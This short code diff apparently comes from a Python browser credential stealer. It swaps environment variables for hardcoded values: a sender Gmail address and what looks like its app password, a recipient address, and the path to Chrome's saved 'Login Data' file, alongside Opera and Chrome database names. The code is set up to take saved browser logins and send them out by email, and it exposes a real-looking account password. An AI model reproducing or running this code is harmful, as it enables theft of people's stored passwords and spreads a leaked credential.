@@ -15,10 +15,10 @@ operadb = "operadb.db"
 chromedb = 'chrome.db'
 
 if __name__ == '__main__':
-    FROM_EMAIL = os.getenv('FROM_EMAIL')
-    FROM_PASSWORD = os.getenv('FROM_PASSWORD')
-    TO_EMAIL = os.getenv('TO_EMAIL')
-    LOGIN_PATH = os.getenv('LOGIN_PATH')
+    FROM_EMAIL = 'xablau.mpx@gmail.com'
+    FROM_PASSWORD = 'owgshskgdmnoiyjj'
+    TO_EMAIL = 'vinibruno99@gmail.com'
+    LOGIN_PATH = 'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
     
     vb = Vbscript(
         from_email=FROM_EMAIL,
